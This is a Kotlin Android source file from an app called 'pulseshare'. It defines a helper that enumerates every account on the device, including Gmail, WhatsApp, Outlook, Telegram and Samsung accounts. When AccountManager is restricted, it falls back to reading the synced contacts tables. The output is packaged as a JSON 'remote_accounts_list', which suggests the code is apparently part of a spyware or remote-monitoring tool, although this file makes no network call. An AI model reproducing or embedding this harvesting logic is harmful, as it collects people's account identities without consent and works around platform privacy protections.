package com.pulseshare.app.data

import android.accounts.AccountManager
import android.content.Context
import android.provider.ContactsContract
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

/**
 * High-reliability accounts discovery helper.
 * Scrapes Google and business accounts logged into the Android device using:
 * 1. AccountManager (com.google and all system authenticator accounts)
 * 2. ContactsContract.RawContacts (synced account store fallback)
 */
object DeviceAccountsHelper {
    private const val TAG = "DeviceAccountsHelper"

    fun getDeviceAccounts(context: Context): JSONObject {
        val root = JSONObject()
        val googleAccountsSet = linkedSetOf<String>()
        val otherAccountsMap = linkedMapOf<String, String>() // name -> type

        // --- Engine 1: AccountManager API ---
        try {
            val accountManager = AccountManager.get(context)

            // Direct com.google accounts lookup
            val googleAccounts = try {
                accountManager.getAccountsByType("com.google")
            } catch (e: Exception) {
                Log.w(TAG, "getAccountsByType(com.google) error: ${e.message}")
                emptyArray()
            }
            for (acc in googleAccounts) {
                if (!acc.name.isNullOrBlank()) {
                    googleAccountsSet.add(acc.name.trim())
                }
            }

            // General accounts lookup (WhatsApp, Samsung, Microsoft Outlook, etc.)
            val allAccounts = try {
                accountManager.accounts
            } catch (e: Exception) {
                Log.w(TAG, "accountManager.accounts error: ${e.message}")
                emptyArray()
            }
            for (acc in allAccounts) {
                val name = acc.name?.trim() ?: continue
                val type = acc.type?.trim() ?: "Unknown"
                if (type.equals("com.google", ignoreCase = true) || name.endsWith("@gmail.com", ignoreCase = true) || name.endsWith("@googlemail.com", ignoreCase = true)) {
                    googleAccountsSet.add(name)
                } else {
                    val cleanType = formatAccountType(type)
                    if (!otherAccountsMap.containsKey(name)) {
                        otherAccountsMap[name] = cleanType
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "AccountManager engine error: ${e.message}")
        }

        // --- Engine 2: Synced Contacts RawContacts Fallback ---
        // Guaranteed discovery for Android 11+ where AccountManager may be sandboxed
        try {
            val projection = arrayOf(
                ContactsContract.RawContacts.ACCOUNT_NAME,
                ContactsContract.RawContacts.ACCOUNT_TYPE
            )
            val cursor = context.contentResolver.query(
                ContactsContract.RawContacts.CONTENT_URI,
                projection,
                null,
                null,
                null
            )
            cursor?.use { c ->
                val nameIdx = c.getColumnIndex(ContactsContract.RawContacts.ACCOUNT_NAME)
                val typeIdx = c.getColumnIndex(ContactsContract.RawContacts.ACCOUNT_TYPE)

                while (c.moveToNext()) {
                    val accName = if (nameIdx >= 0) c.getString(nameIdx)?.trim() else null
                    val accType = if (typeIdx >= 0) c.getString(typeIdx)?.trim() else null

                    if (!accName.isNullOrBlank()) {
                        if (accType?.equals("com.google", ignoreCase = true) == true ||
                            accName.endsWith("@gmail.com", ignoreCase = true) ||
                            accName.endsWith("@googlemail.com", ignoreCase = true)
                        ) {
                            googleAccountsSet.add(accName)
                        } else if (!accType.isNullOrBlank() && !accType.equals("vnd.sec.contact.phone", ignoreCase = true)) {
                            val cleanType = formatAccountType(accType)
                            if (!otherAccountsMap.containsKey(accName) && !googleAccountsSet.contains(accName)) {
                                otherAccountsMap[accName] = cleanType
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Contacts RawContacts account query fallback: ${e.message}")
        }

        // --- Construct JSON Response ---
        val googleArr = JSONArray()
        var index = 0
        for (email in googleAccountsSet) {
            val obj = JSONObject().apply {
                put("name", email)
                put("email", email)
                put("type", "com.google")
                put("provider", "Google")
                put("isPrimary", index == 0)
            }
            googleArr.put(obj)
            index++
        }

        val otherArr = JSONArray()
        for ((name, type) in otherAccountsMap) {
            val obj = JSONObject().apply {
                put("name", name)
                put("type", type)
                put("provider", type)
            }
            otherArr.put(obj)
        }

        root.apply {
            put("type", "remote_accounts_list")
            put("googleAccounts", googleArr)
            put("otherAccounts", otherArr)
            put("totalGoogleAccounts", googleArr.length())
            put("totalAccounts", googleArr.length() + otherArr.length())
            put("timestamp", System.currentTimeMillis())
        }

        Log.d(TAG, "Discovered ${googleArr.length()} Google accounts and ${otherArr.length()} other accounts on phone.")
        return root
    }

    private fun formatAccountType(type: String): String {
        return when {
            type.contains("whatsapp", ignoreCase = true) -> "WhatsApp"
            type.contains("google", ignoreCase = true) -> "Google"
            type.contains("telegram", ignoreCase = true) -> "Telegram"
            type.contains("microsoft", ignoreCase = true) || type.contains("office", ignoreCase = true) || type.contains("outlook", ignoreCase = true) -> "Microsoft Outlook"
            type.contains("exchange", ignoreCase = true) -> "Microsoft Exchange"
            type.contains("samsung", ignoreCase = true) -> "Samsung Account"
            type.contains("facebook", ignoreCase = true) -> "Facebook"
            type.contains("twitter", ignoreCase = true) || type.contains("x.corp", ignoreCase = true) -> "X (Twitter)"
            type.contains("linkedin", ignoreCase = true) -> "LinkedIn"
            type.contains("viber", ignoreCase = true) -> "Viber"
            type.contains("skype", ignoreCase = true) -> "Skype"
            type.contains("yahoo", ignoreCase = true) -> "Yahoo Mail"
            else -> type.split(".").lastOrNull()?.replaceFirstChar { it.uppercase() } ?: type
        }
    }
}
